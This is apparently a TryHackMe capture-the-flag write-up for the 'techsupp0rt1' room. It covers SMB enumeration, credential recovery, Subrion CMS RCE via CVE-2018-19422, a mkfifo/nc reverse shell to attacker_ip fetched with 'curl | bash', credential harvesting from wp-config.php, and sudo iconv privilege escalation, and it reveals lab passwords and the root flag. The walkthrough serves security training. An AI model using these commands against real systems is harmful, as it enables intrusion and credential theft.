# Room: [techsupp0rt1](https://tryhackme.com/room/techsupp0rt1) (*Hack into the scammer's under-development website to foil their plans.*)


## Basic Enum

Nmap / rustcan

```bash
IP=VICTIM
rustscan -a $IP | tee rustscan.log
[...]
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```

- Samba looks intersting :eye:

```bash
smbclient -N -L \\\\$IP\\   

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	websvr          Disk      
	IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

```

- And sure enough this share websvr is intersting so let's grab the enter.txt file:

```bash
smbclient -N \\\\10.10.213.5\\websvr

smb: \> ls
  .                                   D        0  Sat May 29 09:17:38 2021
  ..                                  D        0  Sat May 29 09:03:47 2021
  enter.txt                           N      273  Sat May 29 09:17:38 2021

                8460484 blocks of size 1024. 5627800 blocks available
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)

```

It gaves quite juicy info:

```bash
cat enter.txt      
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->

```
- Ok so the magical formula was pretty easy thanks to https://gchq.github.io/CyberChef/ I was able to get the admin pass in plaintext!
- So what am I looking for :D probably a way to escalte on Subrion CMS security breach.
- He took me a while to figure out where the panel exactly was, as I was blindly folllwing my gobuster/feroxbuster/dirb results 

<details>
  <summary>Click to reveal the admin pass!</summary>

  ```bash
  Scam2021
  ```
</details>

However the following IP trick me while I was looking for the redirect though:

```bash
curl -IXGET http://techsupp0rt1/subrion -L
HTTP/1.1 301 Moved Permanently
Date: Wed, 20 Apr 2022 20:52:52 GMT
Server: Apache/2.4.18 (Ubuntu)
Location: http://techsupp0rt1/subrion/
Content-Length: 314
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 302 Found
Date: Wed, 20 Apr 2022 20:52:52 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: INTELLI_06c8042c3d=s1veerpuqnscvc79rk8nvpatea; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: INTELLI_06c8042c3d=s1veerpuqnscvc79rk8nvpatea; expires=Wed, 20-Apr-2022 21:22:52 GMT; Max-Age=1800; path=/
Location: http://10.0.2.15/subrion/subrion/
Content-Length: 0
Content-Type: text/html; charset=UTF-8

```

And fair enough I found the path I was looking for:

```bash
curl -IXGET http://techsupp0rt1/subrion/panel -L
HTTP/1.1 301 Moved Permanently
Date: Wed, 20 Apr 2022 20:54:54 GMT
Server: Apache/2.4.18 (Ubuntu)
Location: http://techsupp0rt1/subrion/panel/
Content-Length: 320
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Wed, 20 Apr 2022 20:54:54 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: INTELLI_06c8042c3d=iuhncvbabhnafckhvefbasmo6d; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: INTELLI_06c8042c3d=iuhncvbabhnafckhvefbasmo6d; expires=Wed, 20-Apr-2022 21:24:54 GMT; Max-Age=1800; path=/
X-Robots-Tag: noindex
Vary: Accept-Encoding
Content-Length: 6203
Content-Type: text/html;charset=UTF-8
```

So let's have fun thanks to https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE 

```bash
$ pwd
/var/www/html/subrion/uploads

$ ls -larth /home
total 12K
drwxr-xr-x 23 root     root     4.0K May 28  2021 ..
drwxr-xr-x  3 root     root     4.0K May 28  2021 .
drwxr-xr-x  4 scamsite scamsite 4.0K May 29  2021 scamsite

```

So I found the scamsite user home however as I crashed the shell while trying to stabilize it I decided to upload and running it from the victim machine like so :

on attacker machine:
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip 4242 >/tmp/f" > lol.sh
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
rlwrap nc -nlvp 4242 
```

on victim machine:
```bash
curl attacker_ip:8000/lol.sh | bash
```

Ok so after stabilizing it I was able to start investagting in a more "convenient" way:

```bash
/var/www/html/wordpress$ grep -iE 'user|pass' wp-con*
wp-config.php:/** MySQL database username */
wp-config.php:define( 'DB_USER', 'support' );
wp-config.php:/** MySQL database password */
wp-config.php:define( 'DB_PASSWORD', 'Im{REDACTED}3!' );
wp-config.php: * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.

```

<details>
  <summary>Click to reveal the DB password!</summary>
  
  ```bash
  ImAScammerLOL!123!
  ```
</details>

> The support user was also the one we discovered while quiclky brownsing the wordpress site.

## Basic connection

I used this password with the scamsite username and...it works !
So I did the following steps to get the root flag:

```bash
ssh scamsite@$IP
scamsite@TechSupport:~$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
scamsite@TechSupport:~$ man iconv
scamsite@TechSupport:~$ ls /root/root.txt
ls: cannot access '/root/root.txt': Permission denied
scamsite@TechSupport:~$ LFILE=/root/root.txt
scamsite@TechSupport:~$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
851b{REDACTED}790b  -

```

Thanks to [gtfobins break out from restricted environments](https://gtfobins.github.io/gtfobins/iconv/#sudo) :point_left:

<details>
  <summary>Click to reveal the root flag!</summary>
  
  ```bash
  851b8233a8c09400ec30651bd1529bf1ed02790b 
  ```
</details>
 
Houra :partying_face:



### Useful Links:

[rustscan](https://github.com/RustScan/RustScan)

[revshells](https://www.revshells.com/)

[gtfobins](https://gtfobins.github.io/)

[h3v0x/CVE-2018-19422-SubrionCMS-RCE](https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE)
